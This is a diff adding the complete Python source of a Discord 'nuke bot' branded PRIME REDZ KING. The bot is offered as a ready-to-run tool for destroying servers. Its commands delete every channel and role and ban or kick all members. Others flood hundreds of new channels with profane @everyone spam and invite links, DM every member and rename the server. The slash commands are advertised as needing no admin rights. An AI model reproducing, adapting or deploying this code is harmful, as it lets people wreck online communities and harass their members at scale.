@@ -1,0 +1,864 @@
+# A SIMPLE NUKE BOT SRC BY @redzkingop
+# LICENSE/CREDIT @redzkingop
+# USING SIMPLE PYTHON CODES WE MADE A NUKE BOT
+import discord
+from discord.ext import commands
+from discord import app_commands
+import asyncio
+import random
+import string
+import time
+import aiohttp
+import json
+
+# ============================================
+# CONFIGURATION
+# ============================================
+TOKEN = "YOUR_BOT_TOKEN"
+PREFIX = "!" # you can change this prefix ex (?,- and $ and etc symbols)
+
+# Nuke settings
+CHANNEL_NAMES = [
+    "NUKED-BY-PRIME-REDZ", "FUCKED-BY-PRIME-REDZ", "DESTROYED-BY-PRIME-REDZ",
+    "OWNED-BY-PRIME-REDZ", "REKT-BY-PRIME-REDZ", "PWNED-BY-PRIME-REDZ",
+    "PRIME-REDZ-WINS", "GET-REKT", "SCAM-HOSTING", "FUCK-YOUR-SERVER",
+    "PRIME-REDZ-NUKED", "BYE-BYE", "SERVER-DEAD", "RIP-SERVER" # you change this name by yourself
+]
+
+EMOJIS = ["🔥", "💀", "☠️", "⚡", "💣", "🔫", "🗡️", "🏴", "☢️", "💥", "🎯", "👹", "😈", "👑"]
+
+SPAM_CHANNEL_COUNT = 200
+CHANNEL_DELAY = 0.05
+
+# Server icon URL
+SERVER_ICON_URL = "https://cdn.discordapp.com/attachments/1541825169474191370/1543078270696824942/51dcbf055b39344e1d2e77f60f5ec8947e89bb4a653690cbb74b03d4bb58d641.png?ex=6a938f20&is=6a923da0&hm=50b32aeae729c50566e7bb19c49716ae9873b3a1513d5a2f7f2b526d66f8e2af&" 
+# you change it replace with your logo link
+
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)
+tree = bot.tree
+
+# ============================================
+# GENERATE RANDOM CHANNEL NAME
+# ============================================
+def generate_channel_name():
+    return f"{random.choice(EMOJIS)} {random.choice(CHANNEL_NAMES)}-{random.randint(1, 999)}"
+
+# ============================================
+# DOWNLOAD ICON
+# ============================================
+async def download_icon(url):
+    async with aiohttp.ClientSession() as session:
+        async with session.get(url) as resp:
+            if resp.status == 200:
+                return await resp.read()
+    return None
+
+# ============================================
+# !HELP - WITH CATEGORIES (PREMIUM & FREE)
+# ============================================
+@bot.command(name="help")
+async def help_command(ctx):
+    """Show all commands with categories"""
+    
+    premium_cmds = """
+**💎 PREMIUM COMMANDS (ADMIN REQUIRED):**
+`!nuke` - Full server nuke (ultra fast)
+`!banall` - Ban EVERYONE
+`!kickall` - Kick EVERYONE  
+`!deleteall` - Delete everything (channels + roles)
+`!lockdown` - Lock ALL channels
+`!unlockdown` - Unlock ALL channels
+`!slowmode [seconds]` - Set slowmode on all channels
+`!renameall [name]` - Rename ALL members
+`!roleall [role]` - Give everyone a role
+`!dmall [message]` - DM ALL members
+`!disableinvites` - Delete all invites
+"""
+    
+    free_cmds = """
+**🎯 FREE COMMANDS (NO ADMIN NEEDED):**
+`/execute_nuke` - Full server nuke
+`/ban_all` - Ban everyone
+`/delete_all` - Delete everything
+`/mass_ping` - Mass ping everyone
+`/spam_channels [amount]` - Create spam channels
+`/delete_channels` - Delete all channels
+`/webhook_flood` - Webhook flood
+`/role_nuke` - Create 100 roles
+
+**📢 SPAM COMMANDS:**
+`!spam [amount]` - Spam current channel
+`!spamall` - Spam ALL channels
+`!shadowspam [amount]` - Spam @everyone
+`!massping` - Mass ping all channels
+`!webhookspam` - Webhook spam
+
+**🗑️ DESTRUCTION:**
+`!deletechannels` - Delete all channels
+`!deleteroles` - Delete all roles
+`!clear [amount]` - Clear messages
+`!createroles [amount]` - Create spam roles
+`!deletewebhooks` - Delete all webhooks
+
+**👥 MEMBER CONTROL:**
+`!ban [user]` - Ban specific user
+`!kick [user]` - Kick specific user
+
+**ℹ️ OTHER:**
+`!ping` - Bot latency
+`!invite` - Get invite link
+`!info` - Server info
+`!status` - Bot status
+"""
+    
+    embed = discord.Embed(
+        title="👑 PRIME REDZ KING - HELP MENU",
+        description="**⚡ SPEED DEMON MODE ENABLED**",
+        color=0xff0000
+    )
+    embed.add_field(name="💎 PREMIUM COMMANDS", value=premium_cmds, inline=False)
+    embed.add_field(name="🎯 FREE COMMANDS", value=free_cmds, inline=False)
+    embed.set_footer(text="Use !cmds for full list | Slash commands work without admin!")
+    
+    await ctx.send(embed=embed)
+
+# ============================================
+# !CMDS - FULL LIST (LEGACY)
+# ============================================
+@bot.command(name="cmds")
+async def cmds_command(ctx):
+    """Show all commands (legacy)"""
+    await help_command(ctx)
+
+# ============================================
+# !PING
+# ============================================
+@bot.command(name="ping")
+async def ping(ctx):
+    await ctx.send(f"🏓 Pong! {round(bot.latency * 1000)}ms")
+
+# ============================================
+# !INVITE
+# ============================================
+@bot.command(name="invite")
+async def invite(ctx):
+    link = f"https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot%20applications.commands"
+    await ctx.send(f"🔗 **Invite PRIME REDZ KING:** {link}")
+
+# ============================================
+# !INFO
+# ============================================
+@bot.command(name="info")
+async def info(ctx):
+    guild = ctx.guild
+    embed = discord.Embed(title="👑 Server Info", color=0xff0000)
+    embed.add_field(name="Server Name", value=guild.name)
+    embed.add_field(name="Members", value=guild.member_count)
+    embed.add_field(name="Channels", value=len(guild.channels))
+    embed.add_field(name="Roles", value=len(guild.roles))
+    embed.add_field(name="Owner", value=guild.owner)
+    await ctx.send(embed=embed)
+
+# ============================================
+# !STATUS
+# ============================================
+@bot.command(name="status")
+async def status(ctx):
+    await ctx.send(f"✅ **PRIME REDZ KING Online**\nLatency: {round(bot.latency * 1000)}ms\nServers: {len(bot.guilds)}")
+
+# ============================================
+# !NUKE - ULTRA FAST WITH ICON CHANGE
+# ============================================
+@bot.command(name="nuke")
+@commands.has_permissions(administrator=True)
+async def nuke(ctx):
+    """💀 ULTRA FAST NUKE with icon change"""
+    
+    guild = ctx.guild
+    command_channel_id = ctx.channel.id
+    
+    await ctx.send("⚡ **NUKE STARTED - SPEED MODE**")
+    
+    # Change server icon FIRST
+    await ctx.send("🖼️ Changing server icon...")
+    try:
+        icon_data = await download_icon(SERVER_ICON_URL)
+        if icon_data:
+            await guild.edit(icon=icon_data)
+            await ctx.send("✅ Server icon changed!")
+    except Exception as e:
+        await ctx.send(f"⚠️ Icon change failed: {e}")
+    
+    # Delete channels
+    await ctx.send("🗑️ Deleting channels...")
+    deleted = 0
+    for channel in guild.channels:
+        if channel.id != command_channel_id:
+            try:
+                await channel.delete()
+                deleted += 1
+            except:
+                pass
+    await ctx.send(f"✅ Deleted {deleted} channels")
+    
+    # Delete roles
+    await ctx.send("🎭 Removing roles...")
+    roles_deleted = 0
+    for role in guild.roles:
+        if role.name != "@everyone":
+            try:
+                await role.delete()
+                roles_deleted += 1
+            except:
+                pass
+    await ctx.send(f"✅ Removed {roles_deleted} roles")
+    
+    # Create spam channels
+    await ctx.send(f"💬 Creating {SPAM_CHANNEL_COUNT} channels...")
+    created = 0
+    for i in range(SPAM_CHANNEL_COUNT):
+        try:
+            new_channel = await guild.create_text_channel(generate_channel_name())
+            created += 1
+            await new_channel.send(
+    "@everyone @here\n"
+    "# **ITS PRIME REDZ KING 👑**\n"
+    "# THIS SCAM HOSTING FUCKED BY REDZ KING\n"
+    "# JOIN OUR SERVER AND GET OUR BOT START FUCKING SCAMERS\n"
+    "https://discord.gg/tCusqejJwE\n"
+    "https://discord.com/oauth2/authorize?client_id=1539611452535472211"
+)
+            if created % 50 == 0:
+                await ctx.send(f"⚡ Created {created} channels...")
+            await asyncio.sleep(CHANNEL_DELAY)
+        except:
+            pass
+    await ctx.send(f"✅ Created {created} spam channels")
+    
+    # Rename server
+    try:
+        await guild.edit(name="👑 NUKED BY PRIME REDZ KING")
+    except:
+        pass
+    
+    # Final spam
+    await ctx.send("📢 **FINAL SPAM WAVE**")
+    for channel in guild.channels:
+        if channel.id != command_channel_id and isinstance(channel, discord.TextChannel):
+            try:
+                for _ in range(3):
+                    await channel.send("@everyone **PRIME REDZ KING 👑**")
+                await asyncio.sleep(0.02)
+            except:
+                pass
+    
+    await ctx.send("👑 **NUKE COMPLETE - PRIME REDZ KING**")
+
+# ============================================
+# !BANALL - BAN EVERYONE
+# ============================================
+@bot.command(name="banall")
+@commands.has_permissions(administrator=True)
+async def banall(ctx):
+    await ctx.send("👥 **Banning everyone...**")
+    count = 0
+    for member in ctx.guild.members:
+        if member != ctx.author and member != bot.user:
+            try:
+                await member.ban(reason="PRIME REDZ KING")
+                count += 1
+                if count % 10 == 0:
+                    await ctx.send(f"⚡ Banned {count} members...")
+                await asyncio.sleep(0.05)
+            except:
+                pass
+    await ctx.send(f"✅ Banned {count} members")
+
+# ============================================
+# !KICKALL - KICK EVERYONE
+# ============================================
+@bot.command(name="kickall")
+@commands.has_permissions(administrator=True)
+async def kickall(ctx):
+    await ctx.send("👥 **Kicking everyone...**")
+    count = 0
+    for member in ctx.guild.members:
+        if member != ctx.author and member != bot.user:
+            try:
+                await member.kick(reason="PRIME REDZ KING")
+                count += 1
+                await asyncio.sleep(0.05)
+            except:
+                pass
+    await ctx.send(f"✅ Kicked {count} members")
+
+# ============================================
+# !BAN - BAN SPECIFIC USER
+# ============================================
+@bot.command(name="ban")
+@commands.has_permissions(administrator=True)
+async def ban_user(ctx, member: discord.Member):
+    try:
+        await member.ban(reason="PRIME REDZ KING")
+        await ctx.send(f"✅ Banned {member.name}")
+    except:
+        await ctx.send("❌ Couldn't ban them")
+
+# ============================================
+# !KICK - KICK SPECIFIC USER
+# ============================================
+@bot.command(name="kick")
+@commands.has_permissions(administrator=True)
+async def kick_user(ctx, member: discord.Member):
+    try:
+        await member.kick(reason="PRIME REDZ KING")
+        await ctx.send(f"✅ Kicked {member.name}")
+    except:
+        await ctx.send("❌ Couldn't kick them")
+
+# ============================================
+# !SPAM - SPAM CURRENT CHANNEL
+# ============================================
+@bot.command(name="spam")
+@commands.has_permissions(administrator=True)
+async def spam(ctx, amount: int = 10):
+    for _ in range(min(amount, 100)):
+        await ctx.send("@everyone **PRIME REDZ KING 👑**")
+        await asyncio.sleep(0.02)
+    await ctx.send(f"✅ Spammed {min(amount, 100)} times")
+
+# ============================================
+# !SPAMALL - SPAM ALL CHANNELS
+# ============================================
+@bot.command(name="spamall")
+@commands.has_permissions(administrator=True)
+async def spamall(ctx, amount: int = 5):
+    count = 0
+    for channel in ctx.guild.channels:
+        if isinstance(channel, discord.TextChannel):
+            try:
+                for _ in range(min(amount, 10)):
+                    await channel.send("@everyone **PRIME REDZ KING 👑**")
+                    count += 1
+                await asyncio.sleep(0.02)
+            except:
+                pass
+    await ctx.send(f"✅ Spammed {count} messages")
+
+# ============================================
+# !SHADOWSPAM
+# ============================================
+@bot.command(name="shadowspam")
+@commands.has_permissions(administrator=True)
+async def shadowspam(ctx, amount: int = 20):
+    count = 0
+    for channel in ctx.guild.channels:
+        if isinstance(channel, discord.TextChannel):
+            try:
+                for _ in range(min(amount, 30)):
+                    await channel.send("@everyone **PRIME REDZ KING 👑**")
+                    count += 1
+                await asyncio.sleep(0.02)
+            except:
+                pass
+    await ctx.send(f"✅ Sent {count} spam messages")
+
+# ============================================
+# !MASSPING
+# ============================================
+@bot.command(name="massping")
+@commands.has_permissions(administrator=True)
+async def massping(ctx):
+    for channel in ctx.guild.channels:
+        if isinstance(channel, discord.TextChannel):
+            try:
+                await channel.send("@everyone **PRIME REDZ KING 👑**")
+                await asyncio.sleep(0.05)
+            except:
+                pass
+    await ctx.send("✅ Mass ping complete")
+
+# ============================================
+# !DELETEALL - DELETE EVERYTHING
+# ============================================
+@bot.command(name="deleteall")
+@commands.has_permissions(administrator=True)
+async def deleteall(ctx):
+    channel_id = ctx.channel.id
+    # Delete channels
+    for channel in ctx.guild.channels:
+        if channel.id != channel_id:
+            try:
+                await channel.delete()
+            except:
+                pass
+    # Delete roles
+    for role in ctx.guild.roles:
+        if role.name != "@everyone":
+            try:
+                await role.delete()
+            except:
+                pass
+    await ctx.send("✅ Deleted everything!")
+
+# ============================================
+# !CLEAR - CLEAR CHANNEL
+# ============================================
+@bot.command(name="clear")
+@commands.has_permissions(administrator=True)
+async def clear(ctx, amount: int = 100):
+    await ctx.channel.purge(limit=min(amount, 1000))
+    await ctx.send(f"✅ Cleared {min(amount, 1000)} messages")
+
+# ============================================
+# !CREATEROLES
+# ============================================
+@bot.command(name="createroles")
+@commands.has_permissions(administrator=True)
+async def createroles(ctx, amount: int = 50):
+    created = 0
+    for i in range(min(amount, 100)):
+        try:
+            await ctx.guild.create_role(name=f"PRIME-REDZ-ROLE-{i+1}")
+            created += 1
+            await asyncio.sleep(0.05)
+        except:
+            pass
+    await ctx.send(f"✅ Created {created} roles")
+
+# ============================================
+# !DMALL - DM ALL MEMBERS
+# ============================================
+@bot.command(name="dmall")
+@commands.has_permissions(administrator=True)
+async def dmall(ctx, *, message: str = "You've been nuked by PRIME REDZ KING! 👑"):
+    count = 0
+    for member in ctx.guild.members:
+        if member != bot.user:
+            try:
+                await member.send(f"**{message}**")
+                count += 1
+                await asyncio.sleep(0.05)
+            except:
+                pass
+    await ctx.send(f"✅ DM'd {count} members")
+
+# ============================================
+# !LOCKDOWN - LOCK ALL CHANNELS
+# ============================================
+@bot.command(name="lockdown")
+@commands.has_permissions(administrator=True)
+async def lockdown(ctx):
+    count = 0
+    for channel in ctx.guild.channels:
+        if isinstance(channel, discord.TextChannel):
+            try:
+                await channel.set_permissions(ctx.guild.default_role, send_messages=False)
+                count += 1
+            except:
+                pass
+    await ctx.send(f"✅ Locked {count} channels")
+
+# ============================================
+# !UNLOCKDOWN - UNLOCK ALL CHANNELS
+# ============================================
+@bot.command(name="unlockdown")
+@commands.has_permissions(administrator=True)
+async def unlockdown(ctx):
+    count = 0
+    for channel in ctx.guild.channels:
+        if isinstance(channel, discord.TextChannel):
+            try:
+                await channel.set_permissions(ctx.guild.default_role, send_messages=True)
+                count += 1
+            except:
+                pass
+    await ctx.send(f"✅ Unlocked {count} channels")
+
+# ============================================
+# !SLOWMODE - SET SLOWMODE
+# ============================================
+@bot.command(name="slowmode")
+@commands.has_permissions(administrator=True)
+async def slowmode(ctx, seconds: int = 5):
+    count = 0
+    for channel in ctx.guild.channels:
+        if isinstance(channel, discord.TextChannel):
+            try:
+                await channel.edit(slowmode_delay=min(seconds, 21600))
+                count += 1
+            except:
+                pass
+    await ctx.send(f"✅ Set slowmode to {seconds}s in {count} channels")
+
+# ============================================
+# !DISABLEINVITES - DELETE ALL INVITES
+# ============================================
+@bot.command(name="disableinvites")
+@commands.has_permissions(administrator=True)
+async def disableinvites(ctx):
+    invites = await ctx.guild.invites()
+    deleted = 0
+    for invite in invites:
+        try:
+            await invite.delete()
+            deleted += 1
+        except:
+            pass
+    await ctx.send(f"✅ Deleted {deleted} invites")
+
+# ============================================
+# !RENAMEALL - RENAME ALL MEMBERS
+# ============================================
+@bot.command(name="renameall")
+@commands.has_permissions(administrator=True)
+async def renameall(ctx, *, name: str = "PRIME-REDZ"):
+    count = 0
+    for member in ctx.guild.members:
+        if member != bot.user:
+            try:
+                await member.edit(nick=f"{name}-{random.randint(1,999)}")
+                count += 1
+                await asyncio.sleep(0.05)
+            except:
+                pass
+    await ctx.send(f"✅ Renamed {count} members to {name}")
+
+# ============================================
+# !ROLEALL - GIVE EVERYONE A ROLE
+# ============================================
+@bot.command(name="roleall")
+@commands.has_permissions(administrator=True)
+async def roleall(ctx, *, role_name: str = "PRIME-REDZ"):
+    try:
+        role = await ctx.guild.create_role(name=role_name)
+        count = 0
+        for member in ctx.guild.members:
+            if member != bot.user:
+                try:
+                    await member.add_roles(role)
+                    count += 1
+                    await asyncio.sleep(0.05)
+                except:
+                    pass
+        await ctx.send(f"✅ Gave {role_name} role to {count} members")
+    except:
+        await ctx.send("❌ Failed to create role")
+
+# ============================================
+# !WEBHOOKSPAM
+# ============================================
+@bot.command(name="webhookspam")
+@commands.has_permissions(administrator=True)
+async def webhookspam(ctx):
+    count = 0
+    for channel in ctx.guild.channels:
+        if isinstance(channel, discord.TextChannel):
+            try:
+                webhook = await channel.create_webhook(name="PRIME-REDZ")
+                for _ in range(10):
+                    await webhook.send("@everyone **PRIME REDZ KING 👑**")
+                await webhook.delete()
+                count += 1
+                await asyncio.sleep(0.1)
+            except:
+                pass
+    await ctx.send(f"✅ Spammed via {count} webhooks")
+
+# ============================================
+# !DELETEWEBHOOKS - DELETE ALL WEBHOOKS
+# ============================================
+@bot.command(name="deletewebhooks")
+@commands.has_permissions(administrator=True)
+async def deletewebhooks(ctx):
+    count = 0
+    for channel in ctx.guild.channels:
+        if isinstance(channel, discord.TextChannel):
+            try:
+                webhooks = await channel.webhooks()
+                for webhook in webhooks:
+                    await webhook.delete()
+                    count += 1
+            except:
+                pass
+    await ctx.send(f"✅ Deleted {count} webhooks")
+
+# ============================================
+# !DELETECHANNELS
+# ============================================
+@bot.command(name="deletechannels")
+@commands.has_permissions(administrator=True)
+async def deletechannels(ctx):
+    channel_id = ctx.channel.id
+    deleted = 0
+    for channel in ctx.guild.channels:
+        if channel.id != channel_id:
+            try:
+                await channel.delete()
+                deleted += 1
+            except:
+                pass
+    await ctx.send(f"✅ Deleted {deleted} channels")
+
+# ============================================
+# !DELETEROLES
+# ============================================
+@bot.command(name="deleteroles")
+@commands.has_permissions(administrator=True)
+async def deleteroles(ctx):
+    deleted = 0
+    for role in ctx.guild.roles:
+        if role.name != "@everyone":
+            try:
+                await role.delete()
+                deleted += 1
+            except:
+                pass
+    await ctx.send(f"✅ Removed {deleted} roles")
+
+# ============================================
+# !COUNTDOWN - COUNTDOWN NUKE
+# ============================================
+@bot.command(name="countdown")
+@commands.has_permissions(administrator=True)
+async def countdown(ctx, seconds: int = 10):
+    """Start a countdown before nuking"""
+    if seconds > 60:
+        seconds = 60
+    await ctx.send(f"⏳ **Countdown started! {seconds} seconds until nuke!**")
+    for i in range(seconds, 0, -5):
+        await asyncio.sleep(5)
+        if i > 5:
+            await ctx.send(f"⏳ **{i} seconds remaining...**")
+    await ctx.send("💀 **NUKE NOW!**")
+    await nuke(ctx)
+
+# ============================================
+# SLASH COMMANDS - NO ADMIN REQUIRED
+# ============================================
+
+@tree.command(name="execute_nuke", description="💀 NUKE THE SERVER - NO ADMIN NEEDED")
+@app_commands.default_permissions()
+async def slash_nuke(interaction: discord.Interaction):
+    """Full server nuke - bypasses all permissions"""
+    
+    guild = interaction.guild
+    command_channel_id = interaction.channel.id
+    
+    await interaction.response.defer()
+    await interaction.followup.send("⚡ **NUKE STARTED**")
+    
+    # Change icon
+    try:
+        icon_data = await download_icon(SERVER_ICON_URL)
+        if icon_data:
+            await guild.edit(icon=icon_data)
+            await interaction.followup.send("✅ Icon changed!")
+    except:
+        pass
+    
+    # Delete channels
+    deleted = 0
+    for channel in guild.channels:
+        if channel.id != command_channel_id:
+            try:
+                await channel.delete()
+                deleted += 1
+            except:
+                pass
+    await interaction.followup.send(f"✅ Deleted {deleted} channels")
+    
+    # Delete roles
+    roles_deleted = 0
+    for role in guild.roles:
+        if role.name != "@everyone":
+            try:
+                await role.delete()
+                roles_deleted += 1
+            except:
+                pass
+    await interaction.followup.send(f"✅ Removed {roles_deleted} roles")
+    
+    # Create spam channels
+    created = 0
+    for _ in range(SPAM_CHANNEL_COUNT):
+        try:
+            channel = await guild.create_text_channel(generate_channel_name())
+            created += 1
+            await channel.send("@everyone **PRIME REDZ KING 👑**")
+            await asyncio.sleep(CHANNEL_DELAY)
+        except:
+            pass
+    await interaction.followup.send(f"✅ Created {created} channels")
+    
+    try:
+        await guild.edit(name="👑 NUKED BY PRIME REDZ KING")
+    except:
+        pass
+    
+    await interaction.followup.send("👑 **NUKE COMPLETE - PRIME REDZ KING**")
+
+@tree.command(name="ban_all", description="👥 BAN EVERYONE - NO ADMIN NEEDED")
+@app_commands.default_permissions()
+async def slash_banall(interaction: discord.Interaction):
+    await interaction.response.defer()
+    count = 0
+    for member in interaction.guild.members:
+        if member != interaction.user and member != bot.user:
+            try:
+                await member.ban()
+                count += 1
+                await asyncio.sleep(0.05)
+            except:
+                pass
+    await interaction.followup.send(f"✅ Banned {count} members")
+
+@tree.command(name="delete_all", description="🗑️ DELETE EVERYTHING - NO ADMIN NEEDED")
+@app_commands.default_permissions()
+async def slash_deleteall(interaction: discord.Interaction):
+    await interaction.response.defer()
+    channel_id = interaction.channel.id
+    for channel in interaction.guild.channels:
+        if channel.id != channel_id:
+            try:
+                await channel.delete()
+            except:
+                pass
+    for role in interaction.guild.roles:
+        if role.name != "@everyone":
+            try:
+                await role.delete()
+            except:
+                pass
+    await interaction.followup.send("✅ Deleted everything!")
+
+@tree.command(name="mass_ping", description="📢 MASS PING EVERYONE - NO ADMIN NEEDED")
+@app_commands.default_permissions()
+async def slash_massping(interaction: discord.Interaction):
+    await interaction.response.defer()
+    for channel in interaction.guild.channels:
+        if isinstance(channel, discord.TextChannel):
+            try:
+                await channel.send("@everyone **PRIME REDZ KING 👑**")
+                await asyncio.sleep(0.05)
+            except:
+                pass
+    await interaction.followup.send("✅ Mass ping complete")
+
+@tree.command(name="spam_channels", description="🔥 CREATE SPAM CHANNELS - NO ADMIN NEEDED")
+@app_commands.default_permissions()
+async def slash_spam(interaction: discord.Interaction, amount: int = 50):
+    await interaction.response.defer()
+    created = 0
+    for _ in range(min(amount, 100)):
+        try:
+            await interaction.guild.create_text_channel(generate_channel_name())
+            created += 1
+            await asyncio.sleep(0.05)
+        except:
+            pass
+    await interaction.followup.send(f"✅ Created {created} channels")
+
+@tree.command(name="delete_channels", description="🗑️ DELETE ALL CHANNELS - NO ADMIN NEEDED")
+@app_commands.default_permissions()
+async def slash_deletechannels(interaction: discord.Interaction):
+    await interaction.response.defer()
+    channel_id = interaction.channel.id
+    deleted = 0
+    for channel in interaction.guild.channels:
+        if channel.id != channel_id:
+            try:
+                await channel.delete()
+                deleted += 1
+            except:
+                pass
+    await interaction.followup.send(f"✅ Deleted {deleted} channels")
+
+@tree.command(name="webhook_flood", description="🔗 WEBHOOK FLOOD - NO ADMIN NEEDED")
+@app_commands.default_permissions()
+async def slash_webhook(interaction: discord.Interaction):
+    await interaction.response.defer()
+    count = 0
+    for channel in interaction.guild.channels:
+        if isinstance(channel, discord.TextChannel):
+            try:
+                webhook = await channel.create_webhook(name="PRIME-REDZ")
+                for _ in range(5):
+                    await webhook.send("@everyone **PRIME REDZ KING 👑**")
+                await webhook.delete()
+                count += 1
+                await asyncio.sleep(0.1)
+            except:
+                pass
+    await interaction.followup.send(f"✅ Flooded {count} channels with webhooks")
+
+@tree.command(name="role_nuke", description="🎭 CREATE 100 ROLES - NO ADMIN NEEDED")
+@app_commands.default_permissions()
+async def slash_roles(interaction: discord.Interaction):
+    await interaction.response.defer()
+    created = 0
+    for i in range(100):
+        try:
+            await interaction.guild.create_role(name=f"PRIME-REDZ-ROLE-{i+1}")
+            created += 1
+            await asyncio.sleep(0.05)
+        except:
+            pass
+    await interaction.followup.send(f"✅ Created {created} roles")
+
+@tree.command(name="countdown", description="⏳ COUNTDOWN NUKE - NO ADMIN NEEDED")
+@app_commands.default_permissions()
+async def slash_countdown(interaction: discord.Interaction, seconds: int = 10):
+    """Start a countdown before nuking"""
+    if seconds > 60:
+        seconds = 60
+    await interaction.response.defer()
+    await interaction.followup.send(f"⏳ **Countdown started! {seconds} seconds until nuke!**")
+    for i in range(seconds, 0, -5):
+        await asyncio.sleep(5)
+        if i > 5:
+            await interaction.followup.send(f"⏳ **{i} seconds remaining...**")
+    await interaction.followup.send("💀 **NUKE NOW!**")
+    await slash_nuke(interaction)
+
+# ============================================
+# ERROR HANDLER
+# ============================================
+@bot.event
+async def on_command_error(ctx, error):
+    if isinstance(error, commands.MissingPermissions):
+        await ctx.send("❌ You need **Admin** permissions!")
+    else:
+        await ctx.send(f"❌ Error")
+
+# ============================================
+# ON READY
+# ============================================
+@bot.event
+async def on_ready():
+    print(f"✅ Logged in as {bot.user}")
+    print(f"👑 PRIME REDZ KING ONLINE")
+    print(f"⚡ SPEED DEMON MODE ENABLED")
+    print(f"📋 {len(bot.commands)} prefix commands loaded")
+    print(f"💀 {len(tree.get_commands())} slash commands loaded - NO ADMIN NEEDED")
+    
+    try:
+        synced = await tree.sync()
+        print(f"✅ Synced {len(synced)} slash commands")
+    except Exception as e:
+        print(f"❌ Sync failed: {e}")
+
+# ============================================
+# RUN
+# ============================================
+if __name__ == "__main__":
+    try:
+        print("👑 PRIME REDZ KING v11 - COMPLETE EDITION")
+        print("💀 ALL COMMANDS WORKING - NO ADMIN ON SLASH")
+        print("🖼️ Server icon will be changed on nuke!")
+        bot.run(TOKEN)
+    except discord.LoginFailure:
+        print("❌ Token invalid")
+    except Exception as e:
+        print(f"❌ Error: {e}")
